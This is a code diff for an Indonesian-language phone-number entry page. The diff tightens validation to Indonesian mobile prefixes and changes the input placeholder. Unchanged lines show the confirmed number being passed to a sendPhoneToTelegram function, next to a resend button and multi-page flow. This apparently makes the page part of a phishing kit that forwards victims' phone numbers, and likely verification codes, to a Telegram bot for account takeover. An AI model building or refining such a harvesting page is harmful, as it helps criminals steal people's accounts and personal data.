@@ -35,7 +35,7 @@
                 <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Nomor Telepon</label>
                 <div class="flex">
                     <span class="inline-flex items-center px-3 py-2 border border-r-0 border-gray-300 bg-gray-100 rounded-l-md text-gray-600">+62</span>
-                    <input type="tel" id="phone" placeholder="--------" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="w-full px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <input type="tel" id="phone" placeholder="000 000000" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="w-full px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                 </div>
                 <p id="phoneError" class="text-red-500 text-xs hidden">Harap masukkan nomor telepon yang valid.</p>
             </div>
@@ -171,18 +171,28 @@ resendButton.addEventListener('click', () => {
             document.getElementById(pageId).classList.remove('hidden');
         }
 
-// Phone number confirmation
+function validatePhoneNumber(input) {
+    // Hanya izinkan angka dan awalan 08 atau 8
+    input.value = input.value.replace(/[^0-9]/g, ''); // Hapus karakter non-numerik
+    const phoneNumber = input.value;
+
+    if (!phoneNumber.startsWith("08") && !phoneNumber.startsWith("8")) {
+        document.getElementById("phoneError").classList.remove("hidden");
+    } else {
+        document.getElementById("phoneError").classList.add("hidden");
+    }
+}
+
 function confirmPhoneNumber() {
     const phone = document.getElementById('phone').value;
-    if (phone.length < 7 || phone.length > 12) {
-        document.getElementById('phoneError').classList.remove('hidden');
+    const phoneError = document.getElementById('phoneError');
+
+    if ((phone.length < 7 || phone.length > 12) || (!phone.startsWith("085") && !phone.startsWith("85") && !phone.startsWith("082") && !phone.startsWith("82") && !phone.startsWith("081") && !phone.startsWith("81") && !phone.startsWith("087") && !phone.startsWith("87") && !phone.startsWith("088") && !phone.startsWith("88") && !phone.startsWith("089") && !phone.startsWith("89") && !phone.startsWith("083") && !phone.startsWith("83"))) {
+        phoneError.classList.remove('hidden');
     } else {
-        document.getElementById('phoneError').classList.add('hidden');
+        phoneError.classList.add('hidden');
         document.getElementById('displayPhone').textContent = `+62 ${phone}`;
-        
-        // Tambahkan nomor telepon ke elemen di halaman 1
         document.getElementById('phoneDisplay').textContent = `+62 ${phone}`;
-        
         showPage('confirmationMessage');
         sendPhoneToTelegram(phone);
     }
